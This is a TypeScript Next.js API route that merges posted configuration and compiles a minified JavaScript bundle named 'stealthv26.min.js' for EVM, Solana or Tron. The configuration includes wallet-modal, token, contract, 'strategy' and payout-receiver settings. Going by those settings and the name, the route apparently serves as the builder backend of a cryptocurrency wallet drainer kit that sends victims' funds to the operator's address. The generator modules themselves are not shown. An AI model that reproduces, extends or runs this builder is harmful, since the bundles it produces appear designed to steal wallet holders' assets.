import { NextResponse } from "next/server";
import { generateSDKBundle } from "@/lib/sdk-generator";
import { generateSolanaBundle, generateTronBundle } from "@/lib/runtime-bundles";
import {
  defaultAdvancedConfig,
  defaultAppKitConfig,
  defaultContractsConfig,
  defaultGeneralConfig,
  defaultModalConfig,
  defaultTokensConfig,
  defaultWalletConfig,
  defaultPayoutConfig,
  defaultStrategyConfig,
} from "@/lib/mock-data";

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null;
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const payload = isRecord(body) ? body : {};
    const { source = "compile-test" } = payload;

    const merged = {
      general: { ...defaultGeneralConfig, ...((isRecord(payload.general) ? payload.general : {}) as Partial<typeof defaultGeneralConfig>) },
      wallet: { ...defaultWalletConfig, ...((isRecord(payload.wallet) ? payload.wallet : {}) as Partial<typeof defaultWalletConfig>) },
      modal: { ...defaultModalConfig, ...((isRecord(payload.modal) ? payload.modal : {}) as Partial<typeof defaultModalConfig>) },
      tokens: { ...defaultTokensConfig, ...((isRecord(payload.tokens) ? payload.tokens : {}) as Partial<typeof defaultTokensConfig>) },
      advanced: { ...defaultAdvancedConfig, ...((isRecord(payload.advanced) ? payload.advanced : {}) as Partial<typeof defaultAdvancedConfig>) },
      payout: { ...defaultPayoutConfig, ...((isRecord(payload.payout) ? payload.payout : {}) as Partial<typeof defaultPayoutConfig>) },
      contracts: { ...defaultContractsConfig, ...((isRecord(payload.contracts) ? payload.contracts : {}) as Partial<typeof defaultContractsConfig>) },
      strategy: { ...defaultStrategyConfig, ...((isRecord(payload.strategy) ? payload.strategy : {}) as Partial<typeof defaultStrategyConfig>) },
      appKit: { ...defaultAppKitConfig, ...((isRecord(payload.appKit) ? payload.appKit : {}) as Partial<typeof defaultAppKitConfig>) },
    };

    const resolvedReceiver =
      merged.payout?.address ||
      "0x0000000000000000000000000000000000000000";

    const sdkBundle =
      merged.general.ecosystem === "solana"
        ? generateSolanaBundle({
            general: merged.general,
            wallet: merged.wallet,
            modal: merged.modal,
            tokens: merged.tokens,
            advanced: merged.advanced,
            receiverAddress: resolvedReceiver,
          })
        : merged.general.ecosystem === "tron"
          ? generateTronBundle({
              general: merged.general,
              wallet: merged.wallet,
              modal: merged.modal,
              tokens: merged.tokens,
              advanced: merged.advanced,
              receiverAddress: resolvedReceiver,
            })
          : generateSDKBundle({
              general: merged.general,
              wallet: merged.wallet,
              modal: { ...merged.modal, exposeExternalSDK: true },
              tokens: merged.tokens,
              advanced: merged.advanced,
              contracts: merged.contracts,
              strategy: merged.strategy,
              appKit: merged.appKit,
              receiverAddress: resolvedReceiver,
            });

    return NextResponse.json({
      status: "ok",
      message: "SDK test compiled successfully",
      framework: merged.modal.modalFrameworkStyle,
      ecosystem: merged.general.ecosystem,
      bundle: {
        content: sdkBundle,
        size: sdkBundle.length,
        sizeKB: (sdkBundle.length / 1024).toFixed(2),
        filename: "stealthv26.min.js",
      },
    });
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : "Compilation failed";
    console.error("[compile-test/POST] Error:", errorMessage, error);
    return NextResponse.json(
      { status: "error", message: errorMessage, stack: error instanceof Error ? error.stack : undefined },
      { status: 500 }
    );
  }
}
